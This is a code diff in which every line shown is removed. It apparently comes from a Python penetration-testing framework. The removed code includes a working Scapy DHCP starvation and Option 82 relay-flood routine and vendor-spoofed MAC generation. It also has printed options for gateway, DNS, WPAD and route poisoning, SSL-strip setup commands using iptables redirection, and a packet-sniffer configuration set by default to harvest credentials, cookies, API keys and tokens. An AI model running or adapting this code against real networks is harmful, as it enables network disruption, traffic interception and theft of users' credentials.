-            print(f"{Fore.GREEN}✓ Report generated{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.GREEN}✓ Cleanup completed{Style.RESET_ALL}\n")
-
-
-    def _generate_dhcp_report(self, config):
-        """Generate DHCP attack report"""
-        formats = config['report_format']
-        if formats == 'all':
-            formats = ['txt', 'json', 'html']
-        else:
-            formats = [formats]
-        
-        for fmt in formats:
-            report_file = f"dhcp_report_{config['campaign_name']}.{fmt}"
-            
-            if fmt == 'txt':
-                self._generate_dhcp_txt_report(config, report_file)
-            elif fmt == 'json':
-                self._generate_dhcp_json_report(config, report_file)
-            elif fmt == 'html':
-                self._generate_dhcp_html_report(config, report_file)
-
-
-    def _generate_dhcp_txt_report(self, config, output_file):
-        """Generate text report"""
-        import sqlite3
-        import time
-        
-        content = f"""DHCP STARVATION ATTACK - FINAL REPORT
-{'=' * 70}
-
-Campaign: {config['campaign_name']}
-Generated: {time.strftime('%Y-%m-%d %H:%M:%S')}
-
-CONFIGURATION
--------------
-Interface:      {config['interface']}
-Target Network: {config['target_network']}
-Attack Mode:    {config['attack_mode']}
-Request Count:  {config['request_count']}
-Request Rate:   {config['request_rate']} req/s
-
-"""
-        
-        # Get statistics from database
-        if config['enable_database']:
-            try:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT requests_sent, offers_received, leases_acquired FROM campaigns WHERE id = 1')
-                row = cursor.fetchone()
-                if row:
-                    requests, offers, leases = row
-                    
-                    content += f"""STATISTICS
-----------
-Requests Sent:      {requests}
-Offers Received:    {offers}
-Leases Acquired:    {leases}
-Success Rate:       {(leases/requests*100) if requests > 0 else 0:.1f}%
-
-"""
-                
-                # Get lease information
-                cursor.execute('SELECT COUNT(*) FROM leases WHERE campaign_id = 1')
-                lease_count = cursor.fetchone()[0]
-                
-                if lease_count > 0:
-                    content += "ACQUIRED LEASES\n"
-                    content += "-" * 70 + "\n"
-                    
-                    cursor.execute('SELECT mac_address, ip_address, server_ip FROM leases WHERE campaign_id = 1 LIMIT 10')
-                    for row in cursor.fetchall():
-                        content += f"  {row[0]:<20} → {row[1]:<15} (Server: {row[2]})\n"
-                
-                conn.close()
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        with open(output_file, 'w') as f:
-            f.write(content)
-
-
-    def _generate_dhcp_json_report(self, config, output_file):
-        """Generate JSON report"""
-        import json
-        import sqlite3
-        import time
-        
-        report = {
-            'campaign': config['campaign_name'],
-            'timestamp': time.time(),
-            'configuration': {
-                'interface': config['interface'],
-                'target_network': config['target_network'],
-                'attack_mode': config['attack_mode'],
-                'request_count': config['request_count']
-            },
-            'statistics': {},
-            'leases': []
-        }
-        
-        # Get data from database
-        if config['enable_database']:
-            try:
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                cursor.execute('SELECT requests_sent, offers_received, leases_acquired FROM campaigns WHERE id = 1')
-                row = cursor.fetchone()
-                if row:
-                    report['statistics'] = {
-                        'requests_sent': row[0],
-                        'offers_received': row[1],
-                        'leases_acquired': row[2]
-                    }
-                
-                cursor.execute('SELECT mac_address, ip_address FROM leases WHERE campaign_id = 1 LIMIT 20')
-                for row in cursor.fetchall():
-                    report['leases'].append({'mac': row[0], 'ip': row[1]})
-                
-                conn.close()
-            except Exception as e:
-                # Silently handle exception - consider logging in production
-                if hasattr(self, "debug") and getattr(self, "debug", False):
-                    print(f"[DEBUG] Exception: {e}")
-        
-        with open(output_file, 'w') as f:
-            json.dump(report, f, indent=2)
-
-
-    def _generate_dhcp_html_report(self, config, output_file):
-        """Generate HTML report"""
-        import time
-        
-        html = f"""<!DOCTYPE html>
-<html>
-<head>
-    <title>DHCP Report - {config['campaign_name']}</title>
-    <style>
-        body {{ font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }}
-        .container {{ max-width: 1200px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; }}
-        h1 {{ color: #333; border-bottom: 3px solid #e74c3c; padding-bottom: 10px; }}
-        table {{ width: 100%; border-collapse: collapse; margin: 20px 0; }}
-        th, td {{ padding: 12px; text-align: left; border-bottom: 1px solid #ddd; }}
-        th {{ background: #e74c3c; color: white; }}
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>DHCP Starvation Attack Report</h1>
-        <p><strong>Campaign:</strong> {config['campaign_name']}</p>
-        <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
-        
-        <h2>Configuration</h2>
-        <table>
-            <tr><td><strong>Interface</strong></td><td>{config['interface']}</td></tr>
-            <tr><td><strong>Target Network</strong></td><td>{config['target_network']}</td></tr>
-            <tr><td><strong>Attack Mode</strong></td><td>{config['attack_mode']}</td></tr>
-            <tr><td><strong>Request Count</strong></td><td>{config['request_count']}</td></tr>
-        </table>
-    </div>
-</body>
-</html>"""
-        
-        with open(output_file, 'w') as f:
-            f.write(html)
-
-
-    def _emergency_stop_handler(self, config):
-        """Emergency stop handler for DHCP attacks"""
-        from colorama import Fore, Style
-        
-        print(f"\n{Fore.RED}━━━ EMERGENCY STOP ACTIVATED ━━━{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Halting all DHCP attack operations{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Releasing acquired leases{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Stopping packet transmission{Style.RESET_ALL}")
-        
-        # Release all leases immediately
-        if config['enable_database']:
-            try:
-                import sqlite3
-                conn = sqlite3.connect(config['db_file'])
-                cursor = conn.cursor()
-                
-                # Mark all leases as released
-                cursor.execute('UPDATE leases SET released = 1 WHERE campaign_id = 1 AND released = 0')
-                released_count = cursor.rowcount
-                conn.commit()
-                conn.close()
-                
-                print(f"{Fore.GREEN}✓ Released {released_count} active leases{Style.RESET_ALL}")
-            except Exception as e:
-                print(f"{Fore.RED}✗ Error releasing leases: {str(e)}{Style.RESET_ALL}")
-        
-        # Restore network interface to normal state
-        try:
-            import subprocess
-            subprocess.run(['ip', 'link', 'set', config['interface'], 'down'], 
-                         capture_output=True, timeout=5)
-            subprocess.run(['ip', 'link', 'set', config['interface'], 'up'], 
-                         capture_output=True, timeout=5)
-            print(f"{Fore.GREEN}✓ Network interface reset{Style.RESET_ALL}")
-        except Exception as e:
-            print(f"{Fore.YELLOW}⚠ Warning: Interface reset failed{Style.RESET_ALL}")
-        
-        print(f"{Fore.GREEN}✓ Emergency stop completed{Style.RESET_ALL}\n")
-
-
-    def _advanced_mac_spoofing(self, config, index):
-        """Advanced MAC address generation with vendor spoofing"""
-        
-        # Vendor-specific MAC prefixes (OUI - Organizationally Unique Identifier)
-        vendor_prefixes = {
-            'cisco': ['00:1A:A1', '00:1B:D4', '00:1C:0E', '00:1D:45', '00:1E:13'],
-            'dell': ['00:14:22', '00:15:C5', '00:1A:A0', '00:1E:C9', '00:21:9B'],
-            'hp': ['00:17:A4', '00:1B:78', '00:1E:0B', '00:21:5A', '00:23:7D'],
-            'apple': ['00:03:93', '00:17:F2', '00:1B:63', '00:1E:52', '00:23:32'],
-            'intel': ['00:02:B3', '00:0E:0C', '00:13:02', '00:15:00', '00:1B:21'],
-            'microsoft': ['00:50:F2', '00:15:5D', '00:0D:3A', '7C:ED:8D', '00:03:FF']
-        }
-        
-        if config['mac_generation'] == 'vendor':
-            vendor = config.get('mac_vendor', 'cisco').lower()
-            if vendor in vendor_prefixes:
-                prefix = random.choice(vendor_prefixes[vendor])
-                # Generate random last 3 octets
-                suffix = ':'.join(['%02x' % random.randint(0, 255) for _ in range(3)])
-                return f"{prefix}:{suffix}"
-        
-        elif config['mac_generation'] == 'sequential':
-            # Sequential MAC generation: 00:11:22:33:XX:XX
-            high_byte = (index // 256) % 256
-            low_byte = index % 256
-            return f"00:11:22:33:{high_byte:02x}:{low_byte:02x}"
-        
-        elif config['mac_generation'] == 'random':
-            # Truly random MAC
-            from scapy.all import RandMAC
-            return str(RandMAC())
-        
-        else:
-            # Default to random
-            from scapy.all import RandMAC
-            return str(RandMAC())
-
-
-    def _dhcp_relay_attack(self, config):
-        """DHCP relay agent attack (Option 82 injection)"""
-        from colorama import Fore, Style
-        from scapy.all import BOOTP, DHCP, Ether, IP, UDP, sendp
-        import random
-        
-        print(f"\n{Fore.CYAN}━━━ DHCP RELAY AGENT ATTACK ━━━{Style.RESET_ALL}\n")
-        print(f"{Fore.YELLOW}→ Injecting Option 82 (Relay Agent Information){Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}→ Bypassing DHCP snooping protection{Style.RESET_ALL}\n")
-        
-        for i in range(10):  # Send 10 relay attack packets
-            mac = self._advanced_mac_spoofing(config, i)
-            transaction_id = random.randint(0, 0xFFFFFFFF)
-            
-            # Craft DHCP discover with Option 82
-            discover = Ether(dst="ff:ff:ff:ff:ff:ff", src=mac) / \
-                      IP(src="0.0.0.0", dst="255.255.255.255") / \
-                      UDP(sport=68, dport=67) / \
-                      BOOTP(chaddr=mac, xid=transaction_id, flags=0x8000) / \
-                      DHCP(options=[
-                          ("message-type", "discover"),
-                          ("relay_agent_info", b'\x01\x08\x00\x06\x00\x01\x02\x03\x04\x05'),  # Option 82
-                          ("param_req_list", [1, 3, 6, 15, 28, 51, 58, 59]),
-                          "end"
-                      ])
-            
-            sendp(discover, iface=config['interface'], verbose=0)
-            print(f"{Fore.GREEN}→ Relay attack packet {i+1}/10 sent{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.GREEN}✓ DHCP relay attack completed{Style.RESET_ALL}")
-
-
-    def _network_disruption_advanced(self, config):
-        """Advanced network disruption techniques"""
-        from colorama import Fore, Style
-        
-        print(f"\n{Fore.CYAN}━━━ ADVANCED NETWORK DISRUPTION ━━━{Style.RESET_ALL}\n")
-        
-        # Gateway override attack
-        if config.get('gateway_override'):
-            print(f"{Fore.YELLOW}→ Gateway Override Attack{Style.RESET_ALL}")
-            print(f"  Redirecting default gateway to: {config.get('gateway_redirect', '192.168.1.254')}")
-            print(f"  {Fore.RED}⚠  All client traffic will be redirected{Style.RESET_ALL}")
-        
-        # DNS override attack
-        if config.get('dns_override'):
-            print(f"\n{Fore.YELLOW}→ DNS Override Attack{Style.RESET_ALL}")
-            print(f"  Malicious DNS server: {config.get('dns_redirect', '192.168.1.253')}")
-            print(f"  {Fore.RED}⚠  All DNS queries will be intercepted{Style.RESET_ALL}")
-        
-        # WPAD injection attack
-        if config.get('wpad_injection'):
-            print(f"\n{Fore.YELLOW}→ WPAD Injection Attack{Style.RESET_ALL}")
-            print(f"  WPAD URL: {config.get('wpad_url', 'http://wpad.local/wpad.dat')}")
-            print(f"  {Fore.RED}⚠  Browser proxy configuration will be hijacked{Style.RESET_ALL}")
-        
-        # Route injection
-        if config.get('route_injection'):
-            print(f"\n{Fore.YELLOW}→ Route Injection Attack{Style.RESET_ALL}")
-            print(f"  Malicious routes: {config.get('malicious_routes', '10.0.0.0/8 via attacker')}")
-            print(f"  {Fore.RED}⚠  Network routing tables will be poisoned{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.GREEN}✓ Network disruption configuration applied{Style.RESET_ALL}")
-
-    
-    def run_ssl_strip(self):
-        """SSL stripping attack"""
-        interface = self.module_options.get('interface', 'eth0')
-        port = self.module_options.get('port', '8080')
-        
-        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}║ SSL STRIP ATTACK ║{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}Interface: {Fore.WHITE}{interface}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}Port: {Fore.WHITE}{port}{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW} Prerequisites:{Style.RESET_ALL}")
-        print(f" 1. Active MITM (ARP spoofing)")
-        print(f" 2. IP forwarding enabled")
-        print(f" 3. iptables redirect setup\n")
-        
-        print(f"{Fore.BLUE}Setup steps:{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.CYAN}# 1. Enable IP forwarding")
-        print(f"echo 1 > /proc/sys/net/ipv4/ip_forward")
-        print(f"")
-        print(f"# 2. Redirect traffic to sslstrip")
-        print(f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {port}")
-        print(f"")
-        print(f"# 3. Run sslstrip")
-        print(f"sslstrip -l {port} -w sslstrip.log")
-        print(f"")
-        print(f"# 4. Start ARP spoofing")
-        print(f"# use network/arp_spoof{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.GREEN}ℹ What it does:{Style.RESET_ALL}")
-        print(f" • Intercepts HTTPS requests")
-        print(f" • Serves HTTP version to victim")
-        print(f" • Victim sees HTTP, you see credentials")
-        print(f" • Defeats basic SSL{Style.RESET_ALL}\n")
-        
-        print(f"{Fore.YELLOW}Note: Modern browsers have HSTS protection{Style.RESET_ALL}")
-    
-    def run_packet_sniffer(self):
-        """
-        Enterprise Packet Sniffer & Network Analysis Platform
-        Real-time traffic capture, deep packet inspection, and threat detection
-        """
-        from colorama import Fore, Style
-        import time
-        
-        print(f"\n{Fore.CYAN}{'=' * 80}")
-        print(f"  ENTERPRISE PACKET SNIFFER & NETWORK ANALYSIS PLATFORM")
-        print(f"{'=' * 80}{Style.RESET_ALL}\n")
-        
-        # Load configuration
-        print(f"{Fore.CYAN}━━━ LOADING CONFIGURATION ━━━{Style.RESET_ALL}\n")
-        config = self._load_packet_sniffer_config()
-        
-        if not config:
-            print(f"{Fore.RED}✗ Configuration load failed{Style.RESET_ALL}")
-            return
-        
-        # Display configuration
-        self._display_packet_sniffer_config(config)
-        
-        # Check dependencies
-        print(f"\n{Fore.CYAN}━━━ CHECKING DEPENDENCIES ━━━{Style.RESET_ALL}\n")
-        if not self._check_packet_sniffer_dependencies(config):
-            return
-        
-        # Initialize database
-        if config['enable_database']:
-            print(f"\n{Fore.CYAN}━━━ INITIALIZING DATABASE ━━━{Style.RESET_ALL}\n")
-            if not self._initialize_packet_sniffer_database(config):
-                print(f"{Fore.RED}✗ Database initialization failed{Style.RESET_ALL}")
-                return
-        
-        # Validate interface
-        print(f"\n{Fore.CYAN}━━━ VALIDATING NETWORK INTERFACE ━━━{Style.RESET_ALL}\n")
-        if not self._validate_capture_interface(config):
-            return
-        
-        # Setup capture environment
-        print(f"\n{Fore.CYAN}━━━ PREPARING CAPTURE ENVIRONMENT ━━━{Style.RESET_ALL}\n")
-        if not self._setup_capture_environment(config):
-            return
-        
-        # Display capture plan
-        self._display_capture_plan(config)
-        
-        # Confirmation
-        if config['require_confirmation']:
-            response = input(f"\n{Fore.YELLOW}Start packet capture? [y/N]: {Style.RESET_ALL}").strip().lower()
-            if response != 'y':
-                print(f"{Fore.YELLOW}ℹ  Capture cancelled{Style.RESET_ALL}")
-                return
-        
-        try:
-            # Start capture
-            print(f"\n{Fore.CYAN}{'=' * 80}")
-            print(f"  PACKET CAPTURE ACTIVE")
-            print(f"{'=' * 80}{Style.RESET_ALL}\n")
-            
-            self._execute_packet_capture(config)
-            
-        except KeyboardInterrupt:
-            print(f"\n\n{Fore.YELLOW}━━━ CAPTURE INTERRUPTED ━━━{Style.RESET_ALL}\n")
-        
-        except Exception as e:
-            print(f"\n{Fore.RED}✗ Capture error: {str(e)}{Style.RESET_ALL}")
-            import traceback
-            if config.get('debug_mode'):
-                traceback.print_exc()
-        
-        finally:
-            # Cleanup and reporting
-            print(f"\n{Fore.CYAN}━━━ FINALIZING CAPTURE ━━━{Style.RESET_ALL}\n")
-            self._cleanup_packet_sniffer(config)
-    
-    def _load_packet_sniffer_config(self):
-        """Load and validate packet sniffer configuration"""
-        try:
-            config = {
-                # === CAPTURE INTERFACE ===
-                'interface': self.module_options.get('interface', 'eth0'),
-                'promiscuous_mode': self._parse_bool(self.module_options.get('promiscuous_mode', 'true')),
-                'monitor_mode': self._parse_bool(self.module_options.get('monitor_mode', 'false')),
-                'buffer_size': int(self.module_options.get('buffer_size', '65536')),
-                'timeout': int(self.module_options.get('timeout', '1000')),
-                
-                # === CAPTURE FILTERS ===
-                'bpf_filter': self.module_options.get('bpf_filter', ''),
-                'protocol_filter': self.module_options.get('protocol_filter', 'all'),  # all, tcp, udp, icmp
-                'port_filter': self.module_options.get('port_filter', ''),  # e.g., "80,443,22"
-                'host_filter': self.module_options.get('host_filter', ''),
-                'network_filter': self.module_options.get('network_filter', ''),
-                'exclude_broadcast': self._parse_bool(self.module_options.get('exclude_broadcast', 'false')),
-                'exclude_multicast': self._parse_bool(self.module_options.get('exclude_multicast', 'false')),
-                
-                # === CAPTURE LIMITS ===
-                'packet_count': int(self.module_options.get('packet_count', '0')),  # 0 = unlimited
-                'capture_duration': int(self.module_options.get('capture_duration', '0')),  # seconds, 0 = unlimited
-                'max_packet_size': int(self.module_options.get('max_packet_size', '65535')),
-                'size_limit': int(self.module_options.get('size_limit', '0')),  # MB, 0 = unlimited
-                'file_rotation': self._parse_bool(self.module_options.get('file_rotation', 'false')),
-                'rotation_size': int(self.module_options.get('rotation_size', '100')),  # MB
-                'rotation_interval': int(self.module_options.get('rotation_interval', '3600')),  # seconds
-                
-                # === PACKET DISSECTION ===
-                'deep_inspection': self._parse_bool(self.module_options.get('deep_inspection', 'true')),
-                'payload_analysis': self._parse_bool(self.module_options.get('payload_analysis', 'true')),
-                'decode_protocols': self._parse_bool(self.module_options.get('decode_protocols', 'true')),
-                'extract_metadata': self._parse_bool(self.module_options.get('extract_metadata', 'true')),
-                'follow_streams': self._parse_bool(self.module_options.get('follow_streams', 'true')),
-                'reassemble_tcp': self._parse_bool(self.module_options.get('reassemble_tcp', 'true')),
-                'defragment_ip': self._parse_bool(self.module_options.get('defragment_ip', 'true')),
-                
-                # === PROTOCOL ANALYSIS ===
-                'analyze_http': self._parse_bool(self.module_options.get('analyze_http', 'true')),
-                'analyze_https': self._parse_bool(self.module_options.get('analyze_https', 'true')),
-                'analyze_dns': self._parse_bool(self.module_options.get('analyze_dns', 'true')),
-                'analyze_ftp': self._parse_bool(self.module_options.get('analyze_ftp', 'true')),
-                'analyze_smtp': self._parse_bool(self.module_options.get('analyze_smtp', 'true')),
-                'analyze_ssh': self._parse_bool(self.module_options.get('analyze_ssh', 'true')),
-                'analyze_telnet': self._parse_bool(self.module_options.get('analyze_telnet', 'true')),
-                'analyze_smb': self._parse_bool(self.module_options.get('analyze_smb', 'true')),
-                'analyze_rdp': self._parse_bool(self.module_options.get('analyze_rdp', 'true')),
-                
-                # === CREDENTIAL EXTRACTION ===
-                'extract_credentials': self._parse_bool(self.module_options.get('extract_credentials', 'true')),
-                'extract_http_auth': self._parse_bool(self.module_options.get('extract_http_auth', 'true')),
-                'extract_ftp_creds': self._parse_bool(self.module_options.get('extract_ftp_creds', 'true')),
-                'extract_smtp_creds': self._parse_bool(self.module_options.get('extract_smtp_creds', 'true')),
-                'extract_telnet_creds': self._parse_bool(self.module_options.get('extract_telnet_creds', 'true')),
-                'extract_cookies': self._parse_bool(self.module_options.get('extract_cookies', 'true')),
-                'extract_api_keys': self._parse_bool(self.module_options.get('extract_api_keys', 'true')),
-                'extract_tokens': self._parse_bool(self.module_options.get('extract_tokens', 'true')),
-                
-                # === FILE EXTRACTION ===
-                'extract_files': self._parse_bool(self.module_options.get('extract_files', 'false')),
-                'file_types': self.module_options.get('file_types', 'all'),  # all, images, documents, executables
-                'max_file_size': int(self.module_options.get('max_file_size', '10')),  # MB
-                'extract_http_files': self._parse_bool(self.module_options.get('extract_http_files', 'true')),
-                'extract_ftp_files': self._parse_bool(self.module_options.get('extract_ftp_files', 'true')),
-                'extract_smb_files': self._parse_bool(self.module_options.get('extract_smb_files', 'true')),
-                
-                # === ANOMALY DETECTION ===
-                'enable_anomaly_detection': self._parse_bool(self.module_options.get('enable_anomaly_detection', 'true')),
-                'detect_port_scans': self._parse_bool(self.module_options.get('detect_port_scans', 'true')),
-                'detect_dos': self._parse_bool(self.module_options.get('detect_dos', 'true')),
-                'detect_arp_spoof': self._parse_bool(self.module_options.get('detect_arp_spoof', 'true')),
-                'detect_dns_tunnel': self._parse_bool(self.module_options.get('detect_dns_tunnel', 'true')),
-                'detect_data_exfil': self._parse_bool(self.module_options.get('detect_data_exfil', 'true')),
-                'detect_suspicious_traffic': self._parse_bool(self.module_options.get('detect_suspicious_traffic', 'true')),
-                'detect_malformed_packets': self._parse_bool(self.module_options.get('detect_malformed_packets', 'true')),
-                
-                # === TRAFFIC ANALYSIS ===
-                'traffic_statistics': self._parse_bool(self.module_options.get('traffic_statistics', 'true')),
-                'bandwidth_monitoring': self._parse_bool(self.module_options.get('bandwidth_monitoring', 'true')),
-                'connection_tracking': self._parse_bool(self.module_options.get('connection_tracking', 'true')),
-                'session_reconstruction': self._parse_bool(self.module_options.get('session_reconstruction', 'true')),
-                'protocol_distribution': self._parse_bool(self.module_options.get('protocol_distribution', 'true')),
-                'geo_location': self._parse_bool(self.module_options.get('geo_location', 'false')),
-                'asn_lookup': self._parse_bool(self.module_options.get('asn_lookup', 'false')),
-                
-                # === PATTERN MATCHING ===
-                'enable_pattern_matching': self._parse_bool(self.module_options.get('enable_pattern_matching', 'false')),
-                'pattern_file': self.module_options.get('pattern_file', ''),
-                'regex_patterns': self.module_options.get('regex_patterns', ''),
-                'keyword_search': self.module_options.get('keyword_search', ''),
-                'signature_detection': self._parse_bool(self.module_options.get('signature_detection', 'false')),
-                'yara_rules': self.module_options.get('yara_rules', ''),
-                
-                # === OUTPUT OPTIONS ===
-                'output_pcap': self._parse_bool(self.module_options.get('output_pcap', 'true')),
-                'pcap_file': self.module_options.get('pcap_file', 'packet_capture.pcap'),
-                'output_json': self._parse_bool(self.module_options.get('output_json', 'true')),
-                'json_file': self.module_options.get('json_file', 'packet_capture.json'),
-                'output_csv': self._parse_bool(self.module_options.get('output_csv', 'false')),
-                'csv_file': self.module_options.get('csv_file', 'packet_capture.csv'),
-                'output_xml': self._parse_bool(self.module_options.get('output_xml', 'false')),
-                
-                # === DATABASE OPTIONS ===
-                'enable_database': self._parse_bool(self.module_options.get('enable_database', 'true')),
-                'db_file': self.module_options.get('db_file', 'packet_sniffer.db'),
-                'store_packets': self._parse_bool(self.module_options.get('store_packets', 'true')),
-                'store_flows': self._parse_bool(self.module_options.get('store_flows', 'true')),
-                'store_alerts': self._parse_bool(self.module_options.get('store_alerts', 'true')),
-                'store_credentials': self._parse_bool(self.module_options.get('store_credentials', 'true')),
-                'store_files': self._parse_bool(self.module_options.get('store_files', 'false')),
-                
-                # === DISPLAY OPTIONS ===
-                'realtime_display': self._parse_bool(self.module_options.get('realtime_display', 'true')),
-                'display_mode': self.module_options.get('display_mode', 'summary'),  # summary, detailed, minimal
-                'display_interval': int(self.module_options.get('display_interval', '5')),  # seconds
-                'color_coding': self._parse_bool(self.module_options.get('color_coding', 'true')),
-                'show_hex_dump': self._parse_bool(self.module_options.get('show_hex_dump', 'false')),
-                'show_payload': self._parse_bool(self.module_options.get('show_payload', 'false')),
-                'alert_notifications': self._parse_bool(self.module_options.get('alert_notifications', 'true')),
-                
-                # === PERFORMANCE OPTIONS ===
-                'use_threading': self._parse_bool(self.module_options.get('use_threading', 'true')),
-                'thread_pool_size': int(self.module_options.get('thread_pool_size', '4')),
-                'async_processing': self._parse_bool(self.module_options.get('async_processing', 'true')),
-                'packet_queue_size': int(self.module_options.get('packet_queue_size', '10000')),
-                'batch_processing': self._parse_bool(self.module_options.get('batch_processing', 'true')),
-                'batch_size': int(self.module_options.get('batch_size', '100')),
-                'memory_optimization': self._parse_bool(self.module_options.get('memory_optimization', 'true')),
-                
-                # === SECURITY OPTIONS ===
-                'require_root': self._parse_bool(self.module_options.get('require_root', 'true')),
-                'require_confirmation': self._parse_bool(self.module_options.get('require_confirmation', 'true')),
-                'sanitize_output': self._parse_bool(self.module_options.get('sanitize_output', 'true')),
-                'encrypt_output': self._parse_bool(self.module_options.get('encrypt_output', 'false')),
-                'encryption_key': self.module_options.get('encryption_key', ''),
-                'secure_deletion': self._parse_bool(self.module_options.get('secure_deletion', 'false')),
-                
-                # === LOGGING OPTIONS ===
-                'enable_logging': self._parse_bool(self.module_options.get('enable_logging', 'true')),
-                'log_file': self.module_options.get('log_file', 'packet_sniffer.log'),
-                'log_level': self.module_options.get('log_level', 'info'),  # debug, info, warning, error
-                'log_rotation': self._parse_bool(self.module_options.get('log_rotation', 'true')),
-                'max_log_size': int(self.module_options.get('max_log_size', '50')),  # MB
-                
-                # === ADVANCED OPTIONS ===
-                'debug_mode': self._parse_bool(self.module_options.get('debug_mode', 'false')),
-                'verbose': self._parse_bool(self.module_options.get('verbose', 'false')),
-                'quiet_mode': self._parse_bool(self.module_options.get('quiet_mode', 'false')),
-                'test_mode': self._parse_bool(self.module_options.get('test_mode', 'false')),
-                'benchmark_mode': self._parse_bool(self.module_options.get('benchmark_mode', 'false')),
-            }
-            
-            # Validate configuration
-            if config['packet_count'] < 0:
-                config['packet_count'] = 0
-            
-            if config['capture_duration'] < 0:
-                config['capture_duration'] = 0
-            
-            # Initialize runtime variables
-            config['start_time'] = time.time()
-            config['packets_captured'] = 0
-            config['bytes_captured'] = 0
-            config['alerts_generated'] = 0
-            config['credentials_found'] = 0
-            config['files_extracted'] = 0
-            config['stop_flag'] = False
-            
-            return config
-            
-        except Exception as e:
-            print(f"{Fore.RED}✗ Configuration error: {str(e)}{Style.RESET_ALL}")
-            return None
-    
-    def _display_packet_sniffer_config(self, config):
-        """Display packet sniffer configuration"""
-        from colorama import Fore, Style
-        
-        print(f"{Fore.CYAN}CAPTURE CONFIGURATION{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  Interface:         {Fore.YELLOW}{config['interface']}{Style.RESET_ALL}")
-        print(f"  Promiscuous Mode:  {Fore.GREEN if config['promiscuous_mode'] else Fore.RED}{'✓' if config['promiscuous_mode'] else '✗'}{Style.RESET_ALL}")
-        print(f"  Monitor Mode:      {Fore.GREEN if config['monitor_mode'] else Fore.RED}{'✓' if config['monitor_mode'] else '✗'}{Style.RESET_ALL}")
-        print(f"  Buffer Size:       {config['buffer_size']} bytes")
-        
-        print(f"\n{Fore.CYAN}FILTERS{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  BPF Filter:        {config['bpf_filter'] or 'None'}")
-        print(f"  Protocol:          {config['protocol_filter']}")
-        if config['port_filter']:
-            print(f"  Ports:             {config['port_filter']}")
-        if config['host_filter']:
-            print(f"  Host:              {config['host_filter']}")
-        
-        print(f"\n{Fore.CYAN}CAPTURE LIMITS{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  Packet Count:      {config['packet_count'] if config['packet_count'] > 0 else 'Unlimited'}")
-        print(f"  Duration:          {config['capture_duration'] if config['capture_duration'] > 0 else 'Unlimited'} seconds")
-        print(f"  Max Packet Size:   {config['max_packet_size']} bytes")
-        
-        print(f"\n{Fore.CYAN}ANALYSIS FEATURES{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
-        print(f"  Deep Inspection:   {Fore.GREEN if config['deep_inspection'] else Fore.RED}{'✓' if config['deep_inspection'] else '✗'}{Style.RESET_ALL}")
-        print(f"  Payload Analysis:  {Fore.GREEN if config['payload_analysis'] else Fore.RED}{'✓' if config['payload_analysis'] else '✗'}{Style.RESET_ALL}")
-        print(f"  Credential Extract:{Fore.GREEN if config['extract_credentials'] else Fore.RED}{'✓' if config['extract_credentials'] else '✗'}{Style.RESET_ALL}")
-        print(f"  Anomaly Detection: {Fore.GREEN if config['enable_anomaly_detection'] else Fore.RED}{'✓' if config['enable_anomaly_detection'] else '✗'}{Style.RESET_ALL}")
-        print(f"  File Extraction:   {Fore.GREEN if config['extract_files'] else Fore.RED}{'✓' if config['extract_files'] else '✗'}{Style.RESET_ALL}")
-        
-        print(f"\n{Fore.CYAN}OUTPUT OPTIONS{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}{'─' * 60}{Style.RESET_ALL}")
-        if config['output_pcap']:
-            print(f"  PCAP File:         {config['pcap_file']}")
-        if config['output_json']:
-            print(f"  JSON File:         {config['json_file']}")
-        if config['enable_database']:
-            print(f"  Database:          {config['db_file']}")
-    
-    def _check_packet_sniffer_dependencies(self, config):
-        """Check required dependencies"""
-        from colorama import Fore, Style
-        import os
-        
-        all_ok = True
-        
-        # Check Scapy
-        try:
-            from scapy.all import sniff, wrpcap, rdpcap
-            print(f"{Fore.GREEN}✓ Scapy available{Style.RESET_ALL}")
-        except ImportError:
-            print(f"{Fore.RED}✗ Scapy not available{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Install: pip3 install scapy{Style.RESET_ALL}")
-            all_ok = False
-        
-        # Check root privileges if required
-        if config['require_root'] and os.geteuid() != 0:
-            print(f"{Fore.YELLOW}⚠  Warning: Not running as root{Style.RESET_ALL}")
-            print(f"{Fore.BLUE}ℹ  Some features may not work without root privileges{Style.RESET_ALL}")
-        else:
-            print(f"{Fore.GREEN}✓ Root privileges available{Style.RESET_ALL}")
-        
-        # Check optional dependencies
-        try:
-            import dpkt
-            print(f"{Fore.GREEN}✓ dpkt available (enhanced dissection){Style.RESET_ALL}")
-        except ImportError:
-            print(f"{Fore.YELLOW}⚠  dpkt not available (optional){Style.RESET_ALL}")
-        
-        try:
-            import pyshark
-            print(f"{Fore.GREEN}✓ pyshark available (Wireshark integration){Style.RESET_ALL}")
-        except ImportError:
